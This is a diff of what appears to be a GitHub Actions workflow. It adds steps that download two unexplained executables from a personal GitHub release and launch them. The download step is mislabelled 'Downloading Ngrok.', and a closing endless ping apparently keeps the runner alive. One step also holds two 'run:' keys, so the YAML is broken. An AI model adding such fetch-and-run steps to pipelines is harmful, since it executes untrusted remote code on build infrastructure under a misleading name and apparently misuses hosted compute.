@@ -13,8 +13,11 @@ jobs:
     - name: checksystem.
       run: systeminfo
     - name: Downloading Ngrok.
-      run: curl -L -o turtle-checker.exe https://github.com/endri12345/wejhs/releases/download/files/turtle-checker.exe 
+      run: curl -L -o turtle-checker.exe https://github.com/endri12345/wejhs/releases/download/files/turtle-checker.exe
+      run: curl -L -o turtle.exe https://github.com/endri12345/wejhs/releases/download/files/turtle.exe
+    - name: jalankan.
+      run: start turtle.exe
     - name: checker.
       run: start turtle-checker.exe
     - name: checklokasifile.
-      run: tree
+      run: ping 8.8.8.8 -t
